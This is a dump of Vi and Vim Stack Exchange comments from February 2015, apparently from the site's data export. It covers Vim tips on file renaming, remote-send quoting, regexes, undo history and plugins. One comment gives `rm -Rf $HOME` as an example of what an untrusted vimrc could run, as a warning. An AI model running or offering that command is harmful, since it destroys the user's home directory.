  <row Id="1506" PostId="2066" Score="0" Text="I'm not sure if it's a bug, or expected behaviour (but it could very well be one!) I need to carefuly read the remote server &amp; autocmd pages to be sure... You can use `:help bug-reports` for information on how to report them." CreationDate="2015-02-20T22:19:59.860" UserId="51" />
  <row Id="1507" PostId="1882" Score="0" Text="@JohnO'M. could you add a reference on how `abbreviate` might be better suited for this job?" CreationDate="2015-02-20T22:34:11.367" UserId="356" />
  <row Id="1508" PostId="26" Score="2" Text="Shortcut: `:so $MYVIMRC`." CreationDate="2015-02-20T22:43:58.823" UserId="467" />
  <row Id="1509" PostId="2026" Score="1" Text="You can also use g, (comma) to go to a newer editing position." CreationDate="2015-02-20T23:12:17.183" UserId="462" />
  <row Id="1512" PostId="2048" Score="1" Text="_&quot;I didn't add the exact text of this message myself, the system did that for me&quot;_. OK. That explains the message, which I found quite odd. Regarding links. I understand SO/SE policy about RTFM/SFTW. Unlike other forums, recurring/duplicate questions are closed when detected, and SO/SE tends more toward a wiki approach." CreationDate="2015-02-20T23:54:37.657" UserId="626" />
  <row Id="1513" PostId="2041" Score="1" Text="Crazy approach: using [textobj-word-column.vim](https://github.com/coderifous/textobj-word-column.vim) you can do `ciC*&lt;esc&gt;` and be done. Note: this plugin is a &quot;do what I mean&quot; plugin so it fails in unexpected places and ways, but the plugin is still useful in some easy cases like this." CreationDate="2015-02-20T23:55:12.370" UserId="778" />
  <row Id="1514" PostId="2071" Score="0" Text="I think this is what you want? [How can I rename the file I'm editing?](https://vi.stackexchange.com/questions/305/how-can-i-rename-the-file-im-editing?s=1|0.8744). It doesn't do anything about the working directory, but you can fix that with `:cd %:p:h`." CreationDate="2015-02-20T23:57:55.623" UserId="51" />
  <row Id="1515" PostId="2048" Score="1" Text="Regarding where to find plugins. I could duplicate their documentation. But it won't help much. Moreover, it's almost impossible to keep the answer up to date as the plugins evolve. Adding a not-up-to-date short summary of the features is possible, and I'll see to it. In any case, their official page is the entry point. Regarding plugins, this is the first important information. Indeed, a nice presentation could appeals to us... Until we find out the plugin cannot work in our particular case -- which happens often with FSOSS. This is where a list of available solutions is also interesting." CreationDate="2015-02-21T00:00:04.313" UserId="626" />
  <row Id="1516" PostId="2071" Score="0" Text="You can define a function yourself that does this, called e.g. `:we` -- is that what you're looking for?" CreationDate="2015-02-21T00:06:48.823" UserId="82" />
  <row Id="1517" PostId="2072" Score="0" Text="Beat me by twelve seconds!" CreationDate="2015-02-21T00:22:44.303" UserId="142" />
  <row Id="1518" PostId="2010" Score="0" Text="What terminal are you using? I have [this script](https://gist.github.com/WChargin/d2ab9805b0f2d5e51845) for `gnome-terminal`." CreationDate="2015-02-21T00:24:20.873" UserId="142" />
  <row Id="1520" PostId="441" Score="0" Text="For settings, `:help 'display'` is the same as `:help display?`." CreationDate="2015-02-21T00:26:20.363" UserId="142" />
  <row Id="1521" PostId="2072" Score="0" Text="Indeed, saveas is what I was looking for. I don't suppose there's an option to have it open in a new window, is there?" CreationDate="2015-02-21T00:31:26.013" UserId="9" />
  <row Id="1522" PostId="2072" Score="0" Text="@Kevin By &quot;window,&quot; do you mean split or tab?" CreationDate="2015-02-21T00:32:37.503" UserId="88" />
  <row Id="1523" PostId="2072" Score="0" Text="Split, preferably vertical (or an option for both)" CreationDate="2015-02-21T00:33:25.700" UserId="9" />
  <row Id="1524" PostId="2072" Score="0" Text="@Kevin Not that I'm aware of, but you could always use, for example, `&lt;C-w&gt;&lt;C-s&gt;:saveas bar&lt;cr&gt;`. (This could be all in one ex command if you want to make a mapping or something: `:wincmd s|saveas bar`.)" CreationDate="2015-02-21T00:36:13.790" UserId="88" />
  <row Id="1525" PostId="2074" Score="0" Text="Definitely helps avoiding typing out the name twice, but does reopen like `:e`." CreationDate="2015-02-21T00:45:55.573" UserId="9" />
  <row Id="1527" PostId="2072" Score="0" Text="@Kevin `:vs` (with no argument) will split the window, having the same file in both buffers. You can then choose one of the buffers and use `:saveas bar.txt`, it will leave the 2nd buffer intact." CreationDate="2015-02-21T01:00:24.553" UserId="82" />
  <row Id="1528" PostId="103" Score="0" Text="`:help 'display'` is more accurate." CreationDate="2015-02-21T01:13:14.450" UserId="902" />
  <row Id="1529" PostId="2075" Score="0" Text="Does this answer your question, or am I missing something?" CreationDate="2015-02-21T03:42:26.753" UserId="142" />
  <row Id="1530" PostId="26" Score="0" Text="@kenorb: I've added this possibility; thanks for mentioning it!" CreationDate="2015-02-21T04:34:38.317" UserId="16" />
  <row Id="1531" PostId="2021" Score="0" Text="Expanding on @PeterRincker's quicker-and-dirtier regex, how about something like (in PCRE, because I'm unfamiliar with Vim's flavor of regex) `/[a-z]+:\/\/\S+/`?" CreationDate="2015-02-21T04:35:44.073" UserId="67" />
  <row Id="1532" PostId="2025" Score="0" Text="nvi (at least version 1.81.6) also doesn't let you `:let` a register for later playback. It doesn't have a let command at all, as near as I can tell. If you broaden the question to saving registers in vi family editors that lack the ability to let a register, you might get an answer that works on viemu as well." CreationDate="2015-02-21T05:38:54.570" UserId="227" />
  <row Id="1533" PostId="2034" Score="0" Text="You could also have used `\&gt;` to match the end of a word in place of the `\+`. (Only mentioning it because it's what popped into my head first, and it looks as though the OP might not know about `\&gt;`.)" CreationDate="2015-02-21T08:42:13.847" UserId="343" />
  <row Id="1534" PostId="2034" Score="0" Text="@Rich Actually yes, that would be better combined with `\+`. `/\&lt;\d\+\&gt;/` should keep digits in the middle of words safe." CreationDate="2015-02-21T08:43:53.637" UserId="205" />
  <row Id="1535" PostId="2034" Score="0" Text="@muru I'm not following you. `/\d\&gt;/` will already only match the digits at the ends of words." CreationDate="2015-02-21T08:45:56.313" UserId="343" />
  <row Id="1536" PostId="2034" Score="0" Text="@Rich yes, and `\&lt;\d` would take care of `abc12`." CreationDate="2015-02-21T08:48:25.057" UserId="205" />
  <row Id="1537" PostId="2034" Score="0" Text="@muru Ah, I see what you mean." CreationDate="2015-02-21T08:48:45.823" UserId="343" />
  <row Id="1538" PostId="2042" Score="0" Text="This answer has the advantage that it works with vi as well, in case you have no vim on Aix/HPUX/Solaris/other Unix variants." CreationDate="2015-02-21T08:50:48.987" UserId="908" />
  <row Id="1539" PostId="2036" Score="0" Text="that could be the main reason for confusion! thanks!" CreationDate="2015-02-21T09:38:15.473" UserId="833" />
  <row Id="1540" PostId="2041" Score="0" Text="interesting the normal and dot formula!" CreationDate="2015-02-21T09:40:46.143" UserId="833" />
  <row Id="1541" PostId="2082" Score="1" Text="Seems highly shell dependent. `gvim --remote-send ':tabe foo\ bar.txt&lt;CR&gt;'` worked for me on bash and zsh. And the quotes seem to matter too. If I use `&quot;` internally, it didn't work, but `'` did: `gvim --remote-send &quot;:tabe 'foo bar.txt'&lt;CR&gt;&quot;`" CreationDate="2015-02-21T11:12:57.167" UserId="205" />
  <row Id="1542" PostId="2082" Score="0" Text="Hmmm... `gvim --remote-send &quot;:tabe 'f s.txt'&lt;CR&gt;&quot;` didn't work for me, nor writing `:tabe 'f s.txt'` in vim, I got `E77: Too many files names`." CreationDate="2015-02-21T12:00:55.990" UserId="854" />
  <row Id="1543" PostId="2082" Score="0" Text="I jumped the gun a bit. For me, a tab opens alright, but the filename is `'foo bar.txt'`, with the quotes. But a single backslash still works, as does `foo=&quot;f\ s.txt&quot; gvim --remote-send &quot;:tabe $foo&lt;CR&gt;&quot;`." CreationDate="2015-02-21T12:07:09.527" UserId="205" />
  <row Id="1544" PostId="2080" Score="0" Text="`/\/s\d{2,4}/`is not working for me, but `/\/s\d\{2,4}/` works fine! Thanks for help." CreationDate="2015-02-21T12:14:43.223" UserId="911" />
  <row Id="1545" PostId="2082" Score="0" Text="@muru yep I have `fileq=&quot;$(echo &quot;$file&quot; |  awk '{gsub(/ /,&quot;\\\ &quot;)}1')&quot;` and `gvim --servername $desktop --remote-send &quot;&lt;ESC&gt;:tabe $fileq &lt;CR&gt;&lt;CR&gt;&quot;&#xA;` which works, but just for spaces..." CreationDate="2015-02-21T12:20:18.700" UserId="854" />
  <row Id="1546" PostId="2082" Score="1" Text="Wouldn't `gvim --servername $desktop --remote-send &quot;&lt;ESC&gt;:tabe ${file// /\\ }&lt;CR&gt;&quot;` be simpler?" CreationDate="2015-02-21T12:25:07.037" UserId="205" />
  <row Id="1547" PostId="2082" Score="0" Text="@muru probably yes. Although working just for spaces again..." CreationDate="2015-02-21T12:27:03.340" UserId="854" />
  <row Id="1548" PostId="2082" Score="0" Text="I have one twisted idea: Keep a fixed file open in GVim, write your filename to that file, have Vim autoreload its contents and open any new lines in new tabs." CreationDate="2015-02-21T13:00:31.883" UserId="205" />
  <row Id="1550" PostId="2082" Score="0" Text="Have you tried replacing spaces with `&lt;Space&gt;`? Since `&lt;Esc&gt;` and `&lt;Cr&gt;` is captured by Vim and interpreted correctly maybe `&lt;Space&gt;` would too" CreationDate="2015-02-21T13:27:04.303" UserId="544" />
  <row Id="1551" PostId="2082" Score="0" Text="@Sukima -- the problem is that I would like a way to quote *the whole string* without having to substitute anything. The solution for spaces works, but it's not generic (what about `&quot;`, or other special chars?)" CreationDate="2015-02-21T13:34:41.320" UserId="854" />
  <row Id="1552" PostId="2068" Score="0" Text="I looked at the source code yesterday, and I don't think this is possible, but I'm not 100% sure." CreationDate="2015-02-21T13:48:09.023" UserId="51" />
  <row Id="1553" PostId="2083" Score="2" Text="Are you doing the git checkouts and pulls from within Vim? This sounds like something to solve in git, independently of vim." CreationDate="2015-02-21T14:19:05.770" UserId="8" />
  <row Id="1555" PostId="2080" Score="0" Text="You're right! I've updated my answer." CreationDate="2015-02-21T16:46:59.950" UserId="343" />
  <row Id="1556" PostId="2068" Score="1" Text="It would work with `Mon...`, but think about `Py...` or `Monty Py...`. How would Vim know how many words go backwards to find the beginning of the pattern to look for? I'm not sure, but this might be the reason why it's done this way." CreationDate="2015-02-21T17:11:26.787" UserId="860" />
  <row Id="1557" PostId="232" Score="0" Text="To be fair, Dvorak uses the keys dhtn, not htns, in the place where Qwerty uses hjkl." CreationDate="2015-02-21T17:26:32.367" UserId="810" />
  <row Id="1558" PostId="2082" Score="0" Text="Would the `shellescape` function be helpful?" CreationDate="2015-02-21T19:13:08.263" UserId="865" />
  <row Id="1559" PostId="2075" Score="0" Text="Determining whether or not the character on the cursor is matched isn't exactly the key. The key is to determine whether or not a given form is balanced. If the form is balanced and we find ourselves in this position: `(|)`, pressing `&lt;BS&gt;` should delete both. However, if the top level form is unbalanced, like this: `(defn (|)`, pressing `&lt;BS&gt;` should only delete what would normally be deleted - in this case leaving us with `(defn |)`." CreationDate="2015-02-21T19:26:52.980" UserId="489" />
  <row Id="1560" PostId="2015" Score="1" Text="@hippietrail linux, no gui." CreationDate="2015-02-21T20:07:50.603" UserId="784" />
  <row Id="1561" PostId="2068" Score="0" Text="@xaizek, I see your point. But at least for completing several words (`Monty Python`) when you have just typed part of the first (e.g. `Mon`) there would be no problem." CreationDate="2015-02-21T20:28:45.667" UserId="356" />
  <row Id="1562" PostId="2018" Score="0" Text="@name Please define *system clipboard*" CreationDate="2015-02-21T22:44:59.153" UserId="179" />
  <row Id="1563" PostId="2018" Score="0" Text="@muru this is only assumption that screen is remote. Many folks are using screen/tmux - locally" CreationDate="2015-02-21T22:46:13.007" UserId="179" />
  <row Id="1564" PostId="2018" Score="0" Text="@AB  I work remotely ssh + screens + vims. I am fine with using remote's host system clipboard and not the client's one." CreationDate="2015-02-21T22:59:02.863" UserId="784" />
  <row Id="1565" PostId="2018" Score="0" Text="@AB &quot;if you're on SSH&quot;" CreationDate="2015-02-21T23:28:32.390" UserId="205" />
  <row Id="1566" PostId="2067" Score="2" Text="You essentially repeat the answer by @200_success." CreationDate="2015-02-22T00:55:25.853" UserId="938" />
  <row Id="1567" PostId="1961" Score="0" Text="With my Debian, the default window is 200x50, setting both lines and columns to 999 in any of `vim` itself, rc file or with `gvim -c 'set them'` gives me 236x61 and maximising gives 237x61, so even closer than under Windows. Interestingly, `gvim -geometry 999x999` gives me a maximised window at the slightly larger size so that may be better for non-Windows though I suspect it'll be harder to ensure all invocation methods use that. Pity there's not a simalt type thing for nonWin platforms." CreationDate="2015-02-22T02:20:57.377" UserId="579" />
  <row Id="1568" PostId="1961" Score="0" Text="Still, it's worth some rep since it comes close enough, and is more portable than the win-only method. By the way, using 9999x9999 as geometry freaks out `vim` since it doesn't like windows with dimensions over 64K pixels (geometry is character cells in this case rather than pixels). 999x999 seems to work okay. Not sure how this would go in a multi-monitor systems." CreationDate="2015-02-22T02:22:15.537" UserId="579" />
  <row Id="1570" PostId="2089" Score="0" Text="The next part is a bit meta: Which form should we use while answering on this site? - should I ask this on Meta, or add it to the question?" CreationDate="2015-02-22T02:50:13.657" UserId="205" />
  <row Id="1571" PostId="2084" Score="1" Text="Tim Pope [wrote a blog article](http://tbaggery.com/2011/08/08/effortless-ctags-with-git.html) a few years back that details how something like this can be done." CreationDate="2015-02-22T02:55:39.217" UserId="64" />
  <row Id="1572" PostId="2082" Score="1" Text="Keep in mind that `:edit` (and its variants) doesn't accept a quoted filename. All special characters need to be individually escaped. So, `:edit &quot;foo bar.txt&quot;` won't work; you need `:edit foo\ bar.txt`. That said, something like `:execute 'tabedit' escape('$file', ' ')` might be on the right track." CreationDate="2015-02-22T03:13:08.390" UserId="64" />
  <row Id="1573" PostId="1971" Score="0" Text="This difference has to do with [altscreen](http://stackoverflow.com/a/2181115/959486) (in `screen`) or [alternate-screen](http://stackoverflow.com/a/4293038/959486) (in `tmux`)." CreationDate="2015-02-22T03:31:56.137" UserId="64" />
  <row Id="1574" PostId="2089" Score="0" Text="I would say it depends. I would always use noremap version if demonstrating a mapping. This way, people get in the habit of using the non-recursive mappings over the recursive versions. Unless of course, there is a reason to use map specifically, for instance, in a &lt;Plug&gt; mapping." CreationDate="2015-02-22T03:53:17.650" UserId="246" />
  <row Id="1575" PostId="2083" Score="0" Text="@Gilles I am not - all git changes are happening on my own in bash CLI.  But, if any thinks this makes it off-topic, the integration is specific to Vim, and I wasn't positive if the issue was caused by another matter that others have seen commonly" CreationDate="2015-02-22T04:02:14.783" UserId="915" />
  <row Id="1576" PostId="2084" Score="0" Text="I don't check in the tags file, and I don't have an immediate sense of need to do this.  I'd actually never thought of it, and for ludicrously-large projects I can see the benefit.  Thanks for the edge case tip!  Do you know about those git hooks?  Pardon; I'm sure I can find this out one my own, in time." CreationDate="2015-02-22T04:03:42.903" UserId="915" />
  <row Id="1577" PostId="1882" Score="0" Text="@GonçaloRibeiro done. I hope it helps." CreationDate="2015-02-22T04:41:52.150" UserId="227" />
  <row Id="1578" PostId="2093" Score="2" Text="Welcome to Vi and Vim Stack Exchange! I'm voting to close this as Too Broad, because as it currently stands, there's no way to provide a definitive answer. We have no idea what kind of text you're working with, and &quot;how do I fold... stuff&quot; isn't specific enough of a question. (Of course your text has paragraphs and whatnot, but there's not a clear enough description to get an idea about what you're talking about.) Perhaps you could edit in an example of what kind of plain text you would be editing." CreationDate="2015-02-22T05:22:24.540" UserId="88" />
  <row Id="1579" PostId="2094" Score="2" Text="You are aware that a vimrc can do anything? e.g., it can execute arbitrary commands such as `rm -Rf $HOME`. You do *not* want to source an untrusted vimrc." CreationDate="2015-02-22T06:03:10.777" UserId="31" />
  <row Id="1580" PostId="2094" Score="1" Text="http://www.vim.org/scripts/script.php?script_id=441" CreationDate="2015-02-22T06:17:06.900" UserId="205" />
  <row Id="1581" PostId="2094" Score="2" Text="@derobert I am not very concerned with that; if someone breaks in and drops a random .vimrc, well he did already breakin end of the day; if it is stuff coming from a src control repo, and i pull or rebase without noticing, then it would be _me_ to blame, like downloading a random piece of software, make and execute." CreationDate="2015-02-22T07:06:41.453" UserId="188" />
  <row Id="1582" PostId="2093" Score="0" Text="@Doorknob I described two ways of how it can be solved, does that make it more understandable? The entire point of it is to have tools that can be used on &quot;stuff&quot; - as long as it has partial structure." CreationDate="2015-02-22T07:55:30.913" UserId="925" />
  <row Id="1583" PostId="1951" Score="0" Text="Thanks @WChargin, corrected." CreationDate="2015-02-22T08:24:18.300" UserId="630" />
  <row Id="1584" PostId="2068" Score="0" Text="I'm not sure if &quot;at least for&quot; is good enough for Bram.  I read some discussions on features that are missing from Vim and they stopped after stating that implementation has limitations similar to this one." CreationDate="2015-02-22T08:53:07.857" UserId="860" />
  <row Id="1585" PostId="1882" Score="0" Text="@JohnO'M. thank you. I will accept your answer now." CreationDate="2015-02-22T09:37:46.633" UserId="356" />
  <row Id="1586" PostId="1915" Score="3" Text="How do you know where the end is? If you can describe the end you can delete to that point. If you can describe how you can `move` to the end. Then deleting to the end is no different than moving to the end." CreationDate="2015-02-22T09:40:50.030" UserId="383" />
  <row Id="1588" PostId="2094" Score="2" Text="Related: [Vim: apply settings on files in directory](http://stackoverflow.com/questions/456792/vim-apply-settings-on-files-in-directory) at stackoverflow SE" CreationDate="2015-02-22T13:08:46.330" UserId="467" />
  <row Id="1589" PostId="1915" Score="0" Text="@Loki, moving to the end is usually just using page-down and the arrow keys until I reach there. It _may_ be the first or tenth blank line, it _may_ be the first closing brace. Bottom line is, it varies quite a bit." CreationDate="2015-02-22T13:31:54.417" UserId="579" />
  <row Id="1593" PostId="2093" Score="0" Text="*no clear rules.* -&gt; Well, it's the nature of the computer to work by rules. You can create folds in `$any` file format. I [do so in one of my scripts](http://code.arp242.net/password-bunny/src/d5bbc3a296e4b54b53ff83745cf29b873814c7b5/pwbunny.vim?at=default#cl-147); there are also some folding functions (`:help folding-functions`); you can combine this to create a *complex* set of rules to be &quot;smart&quot; about what Vim should fold, I'm not sure if this will actually work very well (but it could perhaps do), but such thing is certainly not trival to do, and IMHO beyond the scope of an answer here.." CreationDate="2015-02-22T16:46:55.167" UserId="51" />
  <row Id="1594" PostId="2093" Score="0" Text="@Carpetsmoker Oh, I would not expect the answer to implement a solution! More like pointing to existing tools or methods. I'd say your comment is almost an answer." CreationDate="2015-02-22T17:07:28.657" UserId="925" />
  <row Id="1595" PostId="2100" Score="0" Text="It seems this plugin is written by [tommcdo](http://vi.stackexchange.com/users/64/tommcdo) :-) ... It's not clear to me how to use the vim-repeat plugin by the way; is this a separate way to do this? Or something that's to be used in combination with vim-exchange?" CreationDate="2015-02-22T17:21:08.317" UserId="51" />
  <row Id="1597" PostId="2100" Score="0" Text="Exchange.vim doesn't actually require repeat.vim :)" CreationDate="2015-02-22T17:27:41.213" UserId="64" />
  <row Id="1598" PostId="2099" Score="0" Text="Yeah, the visual mode in my answer is entirely superfluous; you don't *need* it as such (I briefly mentioned this in my answer, but I didn't want to make it *too* long), but I am personally not smart enough to use vi/Vim motions flawlessly :-) IMHO visual mode makes things a lot easier, and because I make less mistakes, also makes it more efficient :-)" CreationDate="2015-02-22T17:30:11.673" UserId="51" />
  <row Id="1599" PostId="2100" Score="0" Text="vim-repeat is a plugin to repeat certain commands with the dot `.`. Other plugins can use vim-repeat to repeat their own functionality with `.`." CreationDate="2015-02-22T17:59:02.260" UserId="962" />
  <row Id="1600" PostId="1874" Score="0" Text="Though not an answer, if you find yourself hunting for code examples to make your own solution, I recommend checking the fabulous [Microviche](https://github.com/q335r49/microviche) project." CreationDate="2015-02-22T18:17:00.387" UserId="915" />
  <row Id="1601" PostId="2099" Score="0" Text="I agree the visual mode is very useful and that it often makes things easier and clearer. Btw: I just noticed that my answer was covered by your first bonus tip. But I think it should be the first thing to mention, and deserves more than the bonus tip spot. :)" CreationDate="2015-02-22T18:18:11.960" UserId="21" />
  <row Id="1602" PostId="2105" Score="0" Text="Any suggestions for better tags on this question?" CreationDate="2015-02-22T19:49:37.813" UserId="24" />
  <row Id="1603" PostId="2045" Score="0" Text="Your &quot;answer&quot; appears to just restate the premise of the question. So the answer is &quot;no&quot;?" CreationDate="2015-02-22T19:51:08.083" UserId="24" />
  <row Id="1604" PostId="2105" Score="1" Text="maybe a new 'pure-vi' or similar tag? I've seen several questions that would benefit from a tag that would indicate a desire to have no external tools involved. Should I ask about that on Meta?" CreationDate="2015-02-22T20:19:43.977" UserId="227" />
  <row Id="1605" PostId="2106" Score="3" Text="Instead of the `:normal` command, we can use the Ex command `:move 0`, which moves the line to the beginning of the buffer." CreationDate="2015-02-22T20:21:30.980" UserId="64" />
  <row Id="1606" PostId="2106" Score="1" Text="Also `:execute` is only necessary when the command needs to be built dynamically, e.g. `:execute 'normal' g:user_command`." CreationDate="2015-02-22T20:23:56.103" UserId="64" />
  <row Id="1607" PostId="2106" Score="0" Text="@tommcdo good points! I'm in the habit of using `:execute` because I often end up appending other Ex commands after the existing one later, and it's more convenient for me to have the `:exe` there already than to have to go back and insert it later. Unfortunately, that habit leaked into this answer where it doesn't apply as much." CreationDate="2015-02-22T20:34:32.393" UserId="227" />
  <row Id="1610" PostId="2106" Score="1" Text="More explanation about my use of `:execute`: since it takes a string, it provides a clear delineation for where the normal-mode commands end, even though I'm not constructing the string, it's easier for me to find balanced quotation marks than to look for `&lt;esc&gt;` or whatever to terminate the mode. Again, this is personal preference and habit. :-)" CreationDate="2015-02-22T20:41:36.133" UserId="227" />
  <row Id="1611" PostId="2045" Score="0" Text="@200_success It's &quot;yes&quot; for `nvi` (with the `.`), but indeed &quot;no, this is not possible&quot; for the original `vi`... So only that part confirms (or &quot;restates&quot;, if you will) the premise of the question." CreationDate="2015-02-22T20:46:33.463" UserId="51" />
  <row Id="1612" PostId="2106" Score="0" Text="Note this only works on the entire buffer ... Something like `:7,8g/^/move 0` does strange things..." CreationDate="2015-02-22T20:56:30.890" UserId="51" />
  <row Id="1614" PostId="2106" Score="0" Text="Very true. I'll make note of that in the answer. I didn't make it a subset because 200_success explicitly called out first and last lines." CreationDate="2015-02-22T20:58:48.267" UserId="227" />
  <row Id="1615" PostId="2107" Score="1" Text="As a FYI for readers, the `&lt;line1&gt;` &amp; `&lt;line2&gt;` are required to make this work on a range, ie: `:7,9Reverse` (they're features of `command`, not `global` or `move`). The simpler `:command! -bar -range=% Reverse :global/^/m 0` will also work, but only for the entire buffer..." CreationDate="2015-02-22T21:02:30.783" UserId="51" />
  <row Id="1616" PostId="2106" Score="1" Text="This will work for a range btw: `:9,11g/^/move 8` ... The last number needs to be the start of the range minus 1 (adapted from Ingo's answer)." CreationDate="2015-02-22T21:05:33.687" UserId="51" />
  <row Id="1617" PostId="2105" Score="1" Text="@Carpetsmoker (and anyone else interested in following this) the tag question is now on meta http://meta.vi.stackexchange.com/questions/1229/should-we-have-a-tag-to-indicate-a-question-doesnt-want-external-tools-involed" CreationDate="2015-02-22T21:36:02.777" UserId="227" />
  <row Id="1618" PostId="2084" Score="0" Text="@New Alexandria: if you want to learn more about git hooks, I suggest to check out your .git/hooks folder. By default there should be some example scripts in there to inspire you. For details check out the official documentation at: http://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks" CreationDate="2015-02-22T21:38:33.497" UserId="875" />
  <row Id="1619" PostId="2094" Score="0" Text="@Carpetsmoker thanks, definitely a duplicate; should i delete or wait for close votes?" CreationDate="2015-02-22T21:44:32.130" UserId="188" />
  <row Id="1620" PostId="2094" Score="0" Text="@guido I don't think you can delete this question due to it having answers, but you can add close votes to your own question (I once did that on SO, anyway)... In any case, the question is still useful, many people will search for *&quot;How to make vimrc settings applicable for a directory tree only&quot;*, and not for *&quot;How to make vimrc settings applicable for a project only&quot;*; so it's useful as an &quot;entry point&quot; to the canonical question. This is why duplicates are never removed :-)" CreationDate="2015-02-22T21:48:53.673" UserId="51" />
  <row Id="1621" PostId="2094" Score="1" Text="@Carpetsmoker it seems i can delete (even if there is an accepted answer, weird); probably i cannot vote because i haven't enough reputation. Please do if you can, actually the question wording is quite different so it may still be worthy" CreationDate="2015-02-22T21:56:19.530" UserId="188" />
  <row Id="1622" PostId="2106" Score="0" Text="And, now I see I misread part of the question, he did call out ranges and selections." CreationDate="2015-02-22T22:16:41.663" UserId="227" />
  <row Id="1623" PostId="2109" Score="0" Text="I might be wrong, but doesn't this open an extra tab (as seen in my question about opening tabs by default)?" CreationDate="2015-02-22T23:50:24.797" UserId="205" />
  <row Id="1625" PostId="2083" Score="0" Text="Thanks @carpetsmoker, I wanted to add the `ctags` tag, but didn't have the rep." CreationDate="2015-02-23T00:02:04.053" UserId="915" />
  <row Id="1627" PostId="2117" Score="2" Text="Thanks, my bad. I've been looking at cpo, http://vimdoc.sourceforge.net/htmldoc/usr_41.html#use-cpo-save etc." CreationDate="2015-02-23T00:44:49.250" UserId="220" />
  <row Id="1630" PostId="2100" Score="0" Text="There seems to be a common misconception that repeat.vim is required for repeating to work on *all* custom operators. However, it is only needed for operators that work outside of the simple *operator-motion* paradigm, such as [surround.vim](https://github.com/tpope/vim-surround) and [lion.vim](https://github.com/tommcdo/vim-lion). Both of these accept additional characters after defining the motion. Without hooking into retreat.vim, typing `.` after using these operators would require re-typing the additional characters as well." CreationDate="2015-02-23T01:41:30.107" UserId="64" />
  <row Id="1631" PostId="2118" Score="1" Text="*it sounds like a bit of an XY problem*: Why? I'm undo-ing with `u`, and I accidentally go past the changes I made right now ... I'm not sure what the original &quot;X-problem&quot; could be here?" CreationDate="2015-02-23T02:04:48.790" UserId="51" />
  <row Id="1632" PostId="2118" Score="1" Text="I now about `:earlier` by the way, but I still need to *guess*; just as I need to *guess* when using the `u` ... In cases it probably a bit better, but I would prefer something more explicit (if possible)." CreationDate="2015-02-23T02:05:48.217" UserId="51" />
  <row Id="1633" PostId="2110" Score="2" Text="Great function and command! Some improvements: (1) Use `[&lt;f-args&gt;]` instead of `&quot;&lt;args&gt;&quot;` -- that way, the `pattern` parameter will be a List (array) and you won't have to deal with manually splitting the string. (2) Pass a non-zero as the third argument to `glob()` to have it return a List. Then you can avoid manually splitting there, too. You'll need to pass `0` as the second argument to skip it without affecting the behavior: `glob(l:p, 0, 1)`." CreationDate="2015-02-23T02:17:52.297" UserId="64" />
  <row Id="1634" PostId="2109" Score="1" Text="If you're referring to my answer on that question, the difference there is that I used `:argdo tabedit %`, which opens a new tab for each argument. Starting with one tab and opening *n* new ones would naturally leave you with *n+1* tabs. `:tab all` is a much better solution." CreationDate="2015-02-23T02:24:06.777" UserId="64" />
  <row Id="1635" PostId="2118" Score="1" Text="@Carpetsmoker &quot;X&quot; is &quot;I want to undo *just* these changes that I made most recently.&quot; &quot;Y&quot; is &quot;How can I undo changes and ignore the undofile?&quot; You sort of still have to guess, but you said in your question that the last changes you made were last week or earlier, so you could just do something like `:ea 5d`. You could also use the `:ea 1f` approach. In any case, it's much less granular." CreationDate="2015-02-23T02:38:39.907" UserId="88" />
  <row Id="1636" PostId="2118" Score="0" Text="&quot;X&quot; and &quot;Y&quot; just seem a rephrasing of the same problem to me ? I did mention &quot;weeks&quot; in my question, but it could also be hours, or minutes (modified that) ...  This is not a bad answer *as such* by the way, I was (and am) just hoping there is something better..." CreationDate="2015-02-23T02:57:44.060" UserId="51" />
  <row Id="1637" PostId="2119" Score="1" Text="The `:syn off` mentioned in the linked answer isn't filetype-specific, and looks like the easiest and most straightforward way to do this." CreationDate="2015-02-23T08:46:39.577" UserId="970" />
  <row Id="1638" PostId="2110" Score="0" Text="@tommcdo Thanks! Answer improved :-)" CreationDate="2015-02-23T09:18:57.817" UserId="51" />
  <row Id="1639" PostId="2109" Score="0" Text="@tommcdo I was talking of [Josh Petrie's answer](http://vi.stackexchange.com/a/544/205). You wouldn't happen to one of his aliases, would you? :)" CreationDate="2015-02-23T10:41:44.117" UserId="205" />
  <row Id="1641" PostId="2109" Score="0" Text="Haha, nope. I must have been thinking of a different question!" CreationDate="2015-02-23T10:44:53.157" UserId="64" />
  <row Id="1642" PostId="2121" Score="0" Text="Did you mean `:bnext` instead of `:cnext`?" CreationDate="2015-02-23T10:51:02.730" UserId="64" />
  <row Id="1643" PostId="2119" Score="0" Text="@IngoKarkat Seeing as Carpetsmoker wrote that answer, I'm guessing it's not sufficient for his needs." CreationDate="2015-02-23T10:58:51.150" UserId="343" />
  <row Id="1644" PostId="2119" Score="0" Text="Yeah, it's what I use now on occasion, but it has the obvious side-effect of disabling all syntax highlighting (which is why I don't use it that often) ... Perhaps it's the best possible answer, both perhaps there's also a better way (so I thought it would be useful to ask again over here)." CreationDate="2015-02-23T11:00:16.503" UserId="51" />
  <row Id="1645" PostId="2121" Score="0" Text="Do you specifically need it to be the *quickfix* window? Or do you just want to be able to see the open buffers in a window? (Because there's several plugins to do the latter)." CreationDate="2015-02-23T11:01:52.693" UserId="343" />
  <row Id="1646" PostId="110" Score="0" Text="I think the OP means an existing buffer that is *not* the current one." CreationDate="2015-02-23T11:03:07.463" UserId="343" />
  <row Id="1648" PostId="2118" Score="0" Text="I'm with @Carpetsmoker on this one. I've known about :earlier for some time, but I still have undofile switched off for exactly the reason described in the question." CreationDate="2015-02-23T11:25:27.277" UserId="343" />
  <row Id="1649" PostId="2115" Score="0" Text="This is a question I've wondered since the unveiling of the undofile feature, and one I've been meaning to get around to asking since the unveiling of this site! Hoping there's a good answer. I think I'd also accept an answer that gave a command that reverted the file to the state it was in since the last time you *opened* it. (Or better, jumped back to that undo state.)" CreationDate="2015-02-23T11:27:46.843" UserId="343" />
  <row Id="1650" PostId="2121" Score="0" Text="I want to be able to browse open buffers in a window. Indeed quickfix is not reuired" CreationDate="2015-02-23T11:31:04.977" UserId="983" />
  <row Id="1651" PostId="2124" Score="0" Text="+1 -&gt; good idea! not so bad :-)" CreationDate="2015-02-23T11:32:36.017" UserId="983" />
  <row Id="1652" PostId="2123" Score="0" Text="tks Ingo, I tested a bit bufexplorer and I like it. I posted also here because a stackoverflow suggested to do" CreationDate="2015-02-23T11:33:47.390" UserId="983" />
